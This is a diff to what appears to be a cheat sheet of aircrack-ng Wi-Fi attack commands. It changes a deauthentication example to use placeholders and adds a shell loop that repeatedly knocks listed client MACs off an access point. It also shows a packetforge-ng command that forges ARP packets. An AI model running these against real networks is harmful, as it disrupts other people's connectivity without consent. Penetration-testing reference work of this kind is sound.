@@ -72,7 +72,7 @@ Set attack mode [Deauthentication](https://www.aircrack-ng.org/doku.php?id=deaut
   - `-a` Target access point MAC address
   - `-c` Set destination MAC address
 ```bash
-$ aireplay-ng -0 5 -e access_point -a A0:21:B7:60:2E:65 -c AC:65:21:B7:2E:60 wlan1
+$ aireplay-ng -0 5 -e ap_name -a ap_mac -c client_mac wlan0mon
 ```
 
 ### Fake Authentication
@@ -137,6 +137,12 @@ Generate packets for injection from PRGA capture.
 ```bash
 packetforge-ng -0 -a ap_mac -h our_mac -k 255.255.255.255 -l 255.255.255.255 -y file.xor -w arp-request
 ``` 
+
+## Loops
+Loop deauthentication attack to target client.
+```bash
+for s in `seq 1 1000` ; do for i in $(cat mac); do sleep 1 && aireplay-ng --deauth 1 -e ap_name -a ap_mac -c $i wlan0mon; done; done
+```
 
 ## Renaming interface (temporary)
 Rename target interface to `wlan1` instead of systemd generated name.
